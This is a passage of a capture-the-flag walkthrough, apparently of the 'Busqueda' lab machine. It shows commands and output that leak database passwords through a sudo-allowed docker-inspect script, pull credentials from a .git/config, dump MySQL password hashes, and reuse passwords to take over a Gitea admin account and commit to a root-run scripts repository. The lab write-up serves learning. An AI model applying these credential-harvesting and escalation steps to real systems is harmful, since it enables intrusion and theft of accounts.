+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">2023</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">01</span> <span class="mi">12</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">07</span> <span class="n">CMD</span><span class="p">:</span> <span class="n">UID</span><span class="o">=</span><span class="mi">1000</span> <span class="n">PID</span><span class="o">=</span><span class="mi">3343</span>   <span class="o">|</span> <span class="n">mysql</span> <span class="o">-</span><span class="n">h</span> <span class="mf">127.0.0.1</span> <span class="o">-</span><span class="n">u</span> <span class="n">gitea</span> <span class="o">-</span><span class="n">P</span> <span class="mi">3306</span> <span class="o">-</span><span class="n">p</span> <span class="n">gitea</span>
+<span class="mi">2023</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">01</span> <span class="mi">12</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">10</span> <span class="n">CMD</span><span class="p">:</span> <span class="n">UID</span><span class="o">=</span><span class="mi">1000</span> <span class="n">PID</span><span class="o">=</span><span class="mi">3344</span>   <span class="o">|</span> <span class="n">ssh</span> <span class="n">gitea</span><span class="o">@</span><span class="mf">127.0.0.1</span> <span class="o">-</span><span class="n">p</span> <span class="mi">222</span>
+<span class="mi">2023</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">01</span> <span class="mi">12</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">23</span> <span class="n">CMD</span><span class="p">:</span> <span class="n">UID</span><span class="o">=</span><span class="mi">1000</span> <span class="n">PID</span><span class="o">=</span><span class="mi">3347</span>   <span class="o">|</span> <span class="n">ssh</span> <span class="n">gitea</span><span class="o">@</span><span class="mf">127.0.0.1</span> <span class="mi">222</span>
+</pre></div>
+</div>
+<p>The password doesn’t seem to work though</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>proxychains -q mysql -h 127.0.0.1 -u gitea -P 3306 -p gitea                                                                            1 ⨯
+Enter password:
+ERROR 1045 (28000): Access denied for user &#39;gitea&#39;@&#39;172.19.0.1&#39; (using password: YES)
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>svc@busqueda:/etc/ssh$<span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^#\|^$&#39;</span><span class="w"> </span>sshd_config
+Include<span class="w"> </span>/etc/ssh/sshd_config.d/*.conf
+KbdInteractiveAuthentication<span class="w"> </span>no
+UsePAM<span class="w"> </span>yes
+X11Forwarding<span class="w"> </span>yes
+PrintMotd<span class="w"> </span>no
+AcceptEnv<span class="w"> </span>LANG<span class="w"> </span>LC_*
+Subsystem<span class="w"> </span>sftp<span class="w">  </span>/usr/lib/openssh/sftp-server
+PasswordAuthentication<span class="w"> </span>yes
+</pre></div>
+</div>
+<p>Found this:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grep<span class="w"> </span>-ri<span class="w"> </span>cody<span class="w"> </span>./*
+./app/.git/config:<span class="w">      </span><span class="nv">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>-l
+<span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>svc:
+Matching<span class="w"> </span>Defaults<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>svc<span class="w"> </span>on<span class="w"> </span>busqueda:
+<span class="w">    </span>env_reset,<span class="w"> </span>mail_badpass,<span class="w"> </span><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,<span class="w"> </span>use_pty
+
+User<span class="w"> </span>svc<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>busqueda:
+<span class="w">    </span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span>/usr/bin/python3<span class="w"> </span>/opt/scripts/system-checkup.py<span class="w"> </span>*
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>svc@busqueda:~$<span class="w"> </span>sudo<span class="w"> </span>/usr/bin/python3<span class="w"> </span>/opt/scripts/system-checkup.py<span class="w"> </span>*
+Usage:<span class="w"> </span>/opt/scripts/system-checkup.py<span class="w"> </span>&lt;action&gt;<span class="w"> </span><span class="o">(</span>arg1<span class="o">)</span><span class="w"> </span><span class="o">(</span>arg2<span class="o">)</span>
+
+<span class="w">     </span>docker-ps<span class="w">     </span>:<span class="w"> </span>List<span class="w"> </span>running<span class="w"> </span>docker<span class="w"> </span>containers
+<span class="w">     </span>docker-inspect<span class="w"> </span>:<span class="w"> </span>Inpect<span class="w"> </span>a<span class="w"> </span>certain<span class="w"> </span>docker<span class="w"> </span>container
+<span class="w">     </span>full-checkup<span class="w">  </span>:<span class="w"> </span>Run<span class="w"> </span>a<span class="w"> </span>full<span class="w"> </span>system<span class="w"> </span>checkup
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>svc@busqueda:~$<span class="w"> </span>sudo<span class="w"> </span>/usr/bin/python3<span class="w"> </span>/opt/scripts/system-checkup.py<span class="w"> </span>docker-ps
+CONTAINER<span class="w"> </span>ID<span class="w">   </span>IMAGE<span class="w">                </span>COMMAND<span class="w">                  </span>CREATED<span class="w">        </span>STATUS<span class="w">          </span>PORTS<span class="w">                                             </span>NAMES
+960873171e2e<span class="w">   </span>gitea/gitea:latest<span class="w">   </span><span class="s2">&quot;/usr/bin/entrypoint…&quot;</span><span class="w">   </span><span class="m">3</span><span class="w"> </span>months<span class="w"> </span>ago<span class="w">   </span>Up<span class="w"> </span><span class="m">11</span><span class="w"> </span>minutes<span class="w">   </span><span class="m">127</span>.0.0.1:3000-&gt;3000/tcp,<span class="w"> </span><span class="m">127</span>.0.0.1:222-&gt;22/tcp<span class="w">   </span>gitea
+f84a6b33fb5a<span class="w">   </span>mysql:8<span class="w">              </span><span class="s2">&quot;docker-entrypoint.s…&quot;</span><span class="w">   </span><span class="m">3</span><span class="w"> </span>months<span class="w"> </span>ago<span class="w">   </span>Up<span class="w"> </span><span class="m">11</span><span class="w"> </span>minutes<span class="w">   </span><span class="m">127</span>.0.0.1:3306-&gt;3306/tcp,<span class="w"> </span><span class="m">33060</span>/tcp<span class="w">               </span>mysql_db
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>svc@busqueda:~$<span class="w"> </span>sudo<span class="w"> </span>/usr/bin/python3<span class="w"> </span>/opt/scripts/system-checkup.py<span class="w"> </span>docker-inspect<span class="w"> </span><span class="s1">&#39;{{json .Config}}&#39;</span><span class="w"> </span>mysql_db<span class="p">|</span>jq<span class="w"> </span>.
+</pre></div>
+</div>
+<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;Hostname&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;f84a6b33fb5a&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;Domainname&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;User&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;AttachStdin&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;AttachStdout&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;AttachStderr&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;ExposedPorts&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;3306/tcp&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span>
+<span class="w">    </span><span class="nt">&quot;33060/tcp&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span>
+<span class="w">  </span><span class="p">},</span>
+<span class="w">  </span><span class="nt">&quot;Tty&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;OpenStdin&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;StdinOnce&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;Env&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="s2">&quot;MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;MYSQL_USER=gitea&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;MYSQL_DATABASE=gitea&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;GOSU_VERSION=1.14&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;MYSQL_MAJOR=8.0&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;MYSQL_VERSION=8.0.31-1.el8&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;MYSQL_SHELL_VERSION=8.0.31-1.el8&quot;</span>
+<span class="w">  </span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;Cmd&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="s2">&quot;mysqld&quot;</span>
+<span class="w">  </span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;Image&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;mysql:8&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;Volumes&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;/var/lib/mysql&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span>
+<span class="w">  </span><span class="p">},</span>
+<span class="w">  </span><span class="nt">&quot;WorkingDir&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;Entrypoint&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="s2">&quot;docker-entrypoint.sh&quot;</span>
+<span class="w">  </span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;OnBuild&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;Labels&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;com.docker.compose.config-hash&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;com.docker.compose.container-number&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;com.docker.compose.oneoff&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;False&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;com.docker.compose.project&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;docker&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;com.docker.compose.project.config_files&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;docker-compose.yml&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;com.docker.compose.project.working_dir&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/root/scripts/docker&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;com.docker.compose.service&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;db&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;com.docker.compose.version&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1.29.2&quot;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>The passwords we have so far:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cody</span><span class="p">:</span><span class="n">jh1usoih2bkjaspwe92</span>
+<span class="n">MYSQL_ROOT_PASSWORD</span><span class="o">=</span><span class="n">jI86kGUuj87guWr3RyF</span>
+<span class="n">MYSQL_PASSWORD</span><span class="o">=</span><span class="n">yuiu1hoiu4i5ho1uh</span>
+</pre></div>
+</div>
+<p>The <code class="docutils literal notranslate"><span class="pre">non</span> <span class="pre">root</span></code> password gives us access to the db</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>svc@busqueda:~$<span class="w"> </span>mysql<span class="w"> </span>-h<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>-u<span class="w"> </span>gitea<span class="w"> </span>-P<span class="w"> </span><span class="m">3306</span><span class="w"> </span>-D<span class="w"> </span>gitea<span class="w"> </span>-p
+Enter<span class="w"> </span>password:
+Reading<span class="w"> </span>table<span class="w"> </span>information<span class="w"> </span><span class="k">for</span><span class="w"> </span>completion<span class="w"> </span>of<span class="w"> </span>table<span class="w"> </span>and<span class="w"> </span>column<span class="w"> </span>names
+You<span class="w"> </span>can<span class="w"> </span>turn<span class="w"> </span>off<span class="w"> </span>this<span class="w"> </span>feature<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>a<span class="w"> </span>quicker<span class="w"> </span>startup<span class="w"> </span>with<span class="w"> </span>-A
+
+Welcome<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>MySQL<span class="w"> </span>monitor.<span class="w">  </span>Commands<span class="w"> </span>end<span class="w"> </span>with<span class="w"> </span><span class="p">;</span><span class="w"> </span>or<span class="w"> </span><span class="se">\g</span>.
+Your<span class="w"> </span>MySQL<span class="w"> </span>connection<span class="w"> </span>id<span class="w"> </span>is<span class="w"> </span><span class="m">25</span>
+Server<span class="w"> </span>version:<span class="w"> </span><span class="m">8</span>.0.31<span class="w"> </span>MySQL<span class="w"> </span>Community<span class="w"> </span>Server<span class="w"> </span>-<span class="w"> </span>GPL
+
+Copyright<span class="w"> </span><span class="o">(</span>c<span class="o">)</span><span class="w"> </span><span class="m">2000</span>,<span class="w"> </span><span class="m">2023</span>,<span class="w"> </span>Oracle<span class="w"> </span>and/or<span class="w"> </span>its<span class="w"> </span>affiliates.
+
+Oracle<span class="w"> </span>is<span class="w"> </span>a<span class="w"> </span>registered<span class="w"> </span>trademark<span class="w"> </span>of<span class="w"> </span>Oracle<span class="w"> </span>Corporation<span class="w"> </span>and/or<span class="w"> </span>its
+affiliates.<span class="w"> </span>Other<span class="w"> </span>names<span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>trademarks<span class="w"> </span>of<span class="w"> </span>their<span class="w"> </span>respective
+owners.
+
+Type<span class="w"> </span><span class="s1">&#39;help;&#39;</span><span class="w"> </span>or<span class="w"> </span><span class="s1">&#39;\h&#39;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>help.<span class="w"> </span>Type<span class="w"> </span><span class="s1">&#39;\c&#39;</span><span class="w"> </span>to<span class="w"> </span>clear<span class="w"> </span>the<span class="w"> </span>current<span class="w"> </span>input<span class="w"> </span>statement.
+
+mysql&gt;
+</pre></div>
+</div>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="n">pager</span><span class="w"> </span><span class="k">less</span><span class="w"> </span><span class="o">-</span><span class="n">SFX</span>
+<span class="n">PAGER</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="s1">&#39;less -SFX&#39;</span>
+
+<span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">user</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+---------------+---------------+-----------+----------------------------------+--------------------+--------------------------------+------------------------------------&gt;</span>
+<span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">lower_name</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">name</span><span class="w">          </span><span class="o">|</span><span class="w"> </span><span class="n">full_name</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">email</span><span class="w">                            </span><span class="o">|</span><span class="w"> </span><span class="n">keep_email_private</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">email_notifications_preference</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">passwd</span><span class="w">                             </span><span class="o">&gt;</span>
+<span class="o">+</span><span class="c1">----+---------------+---------------+-----------+----------------------------------+--------------------+--------------------------------+------------------------------------&gt;</span>
+<span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">administrator</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">administrator</span><span class="w"> </span><span class="o">|</span><span class="w">           </span><span class="o">|</span><span class="w"> </span><span class="n">administrator</span><span class="o">@</span><span class="n">gitea</span><span class="p">.</span><span class="n">searcher</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">|</span><span class="w">                  </span><span class="mi">0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">enabled</span><span class="w">                        </span><span class="o">|</span><span class="w"> </span><span class="n">ba598d99c2202491d36ecf13d5c28b74e27</span><span class="o">&gt;</span>
+<span class="o">|</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">cody</span><span class="w">          </span><span class="o">|</span><span class="w"> </span><span class="n">cody</span><span class="w">          </span><span class="o">|</span><span class="w">           </span><span class="o">|</span><span class="w"> </span><span class="n">cody</span><span class="o">@</span><span class="n">gitea</span><span class="p">.</span><span class="n">searcher</span><span class="p">.</span><span class="n">htb</span><span class="w">          </span><span class="o">|</span><span class="w">                  </span><span class="mi">0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">enabled</span><span class="w">                        </span><span class="o">|</span><span class="w"> </span><span class="n">b1f895e8efe070e184e5539bc5d93b362b2</span><span class="o">&gt;</span>
+
+<span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="n">passwd</span><span class="p">,</span><span class="n">salt</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">user</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">---------------+------------------------------------------------------------------------------------------------------+----------------------------------+</span>
+<span class="o">|</span><span class="w"> </span><span class="n">name</span><span class="w">          </span><span class="o">|</span><span class="w"> </span><span class="n">passwd</span><span class="w">                                                                                               </span><span class="o">|</span><span class="w"> </span><span class="n">salt</span><span class="w">                             </span><span class="o">|</span>
+<span class="o">+</span><span class="c1">---------------+------------------------------------------------------------------------------------------------------+----------------------------------+</span>
+<span class="o">|</span><span class="w"> </span><span class="n">administrator</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">a378d3f64143b284f104c926b8b49dfb</span><span class="w"> </span><span class="o">|</span>
+<span class="o">|</span><span class="w"> </span><span class="n">cody</span><span class="w">          </span><span class="o">|</span><span class="w"> </span><span class="n">b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">d1db0a75a18e50de754be2aafcad5533</span><span class="w"> </span><span class="o">|</span>
+<span class="o">+</span><span class="c1">---------------+------------------------------------------------------------------------------------------------------+----------------------------------+</span>
+<span class="mi">2</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span>
+
+<span class="n">mysql</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+<p>Also, yoink, but sifting through the dump, I don’t think there’s really anything relevant, else than the salted password hashes?</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>proxychains<span class="w"> </span>-q<span class="w"> </span>mysqldump<span class="w"> </span>-h<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>-u<span class="w"> </span>gitea<span class="w"> </span>-P<span class="w"> </span><span class="m">3306</span><span class="w"> </span>--all-databases<span class="w"> </span>-p<span class="p">|</span>tee<span class="w"> </span>dump.sql
+</pre></div>
+</div>
+<p>They are 50 bytes, pbkdf2 with 16bytes salts</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2&#39;</span><span class="p">|</span>wc<span class="w"> </span>-c
+<span class="m">100</span>
+<span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;a378d3f64143b284f104c926b8b49dfb&#39;</span><span class="p">|</span>wc<span class="w"> </span>-c
+<span class="m">32</span>
+</pre></div>
+</div>
+<p>Not sure how I would go about cracking that, but it doesn’t matter because the passwords we found earlier works on the gitea webapp.<br />
+The administrator user corresponds to the <code class="docutils literal notranslate"><span class="pre">mysql</span> <span class="pre">non</span> <span class="pre">root</span></code> password we found earlyer.<br />
+And cody corresponds to cody’s password.<br />
+Happy days, now as the administrator, we can see all source code of the scripts folder</p>
+<p>Heck, we migh even be able to push a code change, let’s see if I can get a key in there:
+<img alt="key.png" src="../../../../_images/key.png" /></p>
+<p>Looks like I can
+<img alt="yes.png" src="../../../../_images/yes.png" /></p>
+<p>Or just using the password with the http endpoint will work too</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>proxychains<span class="w"> </span>git<span class="w"> </span>clone<span class="w"> </span>http://127.0.0.1:3000/administrator/scripts.git
+<span class="o">[</span>proxychains<span class="o">]</span><span class="w"> </span>config<span class="w"> </span>file<span class="w"> </span>found:<span class="w"> </span>/etc/proxychains4.conf
+<span class="o">[</span>proxychains<span class="o">]</span><span class="w"> </span>preloading<span class="w"> </span>/usr/lib/aarch64-linux-gnu/libproxychains.so.4
+<span class="o">[</span>proxychains<span class="o">]</span><span class="w"> </span>DLL<span class="w"> </span>init:<span class="w"> </span>proxychains-ng<span class="w"> </span><span class="m">4</span>.16
+Cloning<span class="w"> </span>into<span class="w"> </span><span class="s1">&#39;scripts&#39;</span>...
+<span class="o">[</span>proxychains<span class="o">]</span><span class="w"> </span>DLL<span class="w"> </span>init:<span class="w"> </span>proxychains-ng<span class="w"> </span><span class="m">4</span>.16
+<span class="o">[</span>proxychains<span class="o">]</span><span class="w"> </span>DLL<span class="w"> </span>init:<span class="w"> </span>proxychains-ng<span class="w"> </span><span class="m">4</span>.16
+<span class="o">[</span>proxychains<span class="o">]</span><span class="w"> </span>Strict<span class="w"> </span>chain<span class="w">  </span>...<span class="w">  </span><span class="m">127</span>.0.0.1:1080<span class="w">  </span>...<span class="w">  </span><span class="m">127</span>.0.0.1:3000<span class="w">  </span>...<span class="w">  </span>OK
+Username<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;http://127.0.0.1:3000&#39;</span>:<span class="w"> </span>administrator
+Password<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;http://administrator@127.0.0.1:3000&#39;</span>:
+remote:<span class="w"> </span>Enumerating<span class="w"> </span>objects:<span class="w"> </span><span class="m">6</span>,<span class="w"> </span><span class="k">done</span>.
+remote:<span class="w"> </span>Counting<span class="w"> </span>objects:<span class="w"> </span><span class="m">100</span>%<span class="w"> </span><span class="o">(</span><span class="m">6</span>/6<span class="o">)</span>,<span class="w"> </span><span class="k">done</span>.
+remote:<span class="w"> </span>Compressing<span class="w"> </span>objects:<span class="w"> </span><span class="m">100</span>%<span class="w"> </span><span class="o">(</span><span class="m">6</span>/6<span class="o">)</span>,<span class="w"> </span><span class="k">done</span>.
+remote:<span class="w"> </span>Total<span class="w"> </span><span class="m">6</span><span class="w"> </span><span class="o">(</span>delta<span class="w"> </span><span class="m">0</span><span class="o">)</span>,<span class="w"> </span>reused<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">(</span>delta<span class="w"> </span><span class="m">0</span><span class="o">)</span>,<span class="w"> </span>pack-reused<span class="w"> </span><span class="m">0</span>
+<span class="o">[</span>proxychains<span class="o">]</span><span class="w"> </span>DLL<span class="w"> </span>init:<span class="w"> </span>proxychains-ng<span class="w"> </span><span class="m">4</span>.16
+Receiving<span class="w"> </span>objects:<span class="w"> </span><span class="m">100</span>%<span class="w"> </span><span class="o">(</span><span class="m">6</span>/6<span class="o">)</span>,<span class="w"> </span><span class="k">done</span>.
+<span class="o">[</span>proxychains<span class="o">]</span><span class="w"> </span>DLL<span class="w"> </span>init:<span class="w"> </span>proxychains-ng<span class="w"> </span><span class="m">4</span>.16
+
+<span class="nb">cd</span><span class="w"> </span>scripts
+
+ls<span class="w"> </span>-la
+total<span class="w"> </span><span class="m">28</span>
+drwxr-xr-x<span class="w">   </span><span class="m">3</span><span class="w"> </span>blnkn<span class="w"> </span>blnkn<span class="w"> </span><span class="m">4096</span><span class="w"> </span>May<span class="w">  </span><span class="m">1</span><span class="w"> </span><span class="m">16</span>:15<span class="w"> </span>.
+drwxr-xr-x<span class="w"> </span><span class="m">124</span><span class="w"> </span>blnkn<span class="w"> </span>blnkn<span class="w"> </span><span class="m">4096</span><span class="w"> </span>May<span class="w">  </span><span class="m">1</span><span class="w"> </span><span class="m">16</span>:16<span class="w"> </span>..
+-rwxr-xr-x<span class="w">   </span><span class="m">1</span><span class="w"> </span>blnkn<span class="w"> </span>blnkn<span class="w">  </span><span class="m">586</span><span class="w"> </span>May<span class="w">  </span><span class="m">1</span><span class="w"> </span><span class="m">16</span>:15<span class="w"> </span>check-ports.py
+-rwxr-xr-x<span class="w">   </span><span class="m">1</span><span class="w"> </span>blnkn<span class="w"> </span>blnkn<span class="w">  </span><span class="m">857</span><span class="w"> </span>May<span class="w">  </span><span class="m">1</span><span class="w"> </span><span class="m">16</span>:15<span class="w"> </span>full-checkup.sh
+drwxr-xr-x<span class="w">   </span><span class="m">8</span><span class="w"> </span>blnkn<span class="w"> </span>blnkn<span class="w"> </span><span class="m">4096</span><span class="w"> </span>May<span class="w">  </span><span class="m">1</span><span class="w"> </span><span class="m">16</span>:15<span class="w"> </span>.git
+-rwxr-xr-x<span class="w">   </span><span class="m">1</span><span class="w"> </span>blnkn<span class="w"> </span>blnkn<span class="w"> </span><span class="m">3346</span><span class="w"> </span>May<span class="w">  </span><span class="m">1</span><span class="w"> </span><span class="m">16</span>:15<span class="w"> </span>install-flask.sh
+-rwxr-xr-x<span class="w">   </span><span class="m">1</span><span class="w"> </span>blnkn<span class="w"> </span>blnkn<span class="w"> </span><span class="m">1903</span><span class="w"> </span>May<span class="w">  </span><span class="m">1</span><span class="w"> </span><span class="m">16</span>:15<span class="w"> </span>system-checkup.py
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>git<span class="w"> </span>log<span class="w"> </span>--oneline
+b9a29dc<span class="w"> </span><span class="o">(</span>HEAD<span class="w"> </span>-&gt;<span class="w"> </span>main,<span class="w"> </span>origin/main,<span class="w"> </span>origin/HEAD<span class="o">)</span><span class="w"> </span>Initial<span class="w"> </span>commit
+
+git<span class="w"> </span>branch<span class="w"> </span>-al
+*<span class="w"> </span>main
+<span class="w">  </span>remotes/origin/HEAD<span class="w"> </span>-&gt;<span class="w"> </span>origin/main
+<span class="w">  </span>remotes/origin/main
+</pre></div>
+</div>
+<p>Making a quick commit</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>git<span class="w"> </span>add<span class="w"> </span>-u
+
+git<span class="w"> </span>commit<span class="w"> </span>-m<span class="w"> </span><span class="s2">&quot;Make it pwnable&quot;</span>
+<span class="o">[</span>main<span class="w"> </span>530309c<span class="o">]</span><span class="w"> </span>Make<span class="w"> </span>it<span class="w"> </span>pwnable
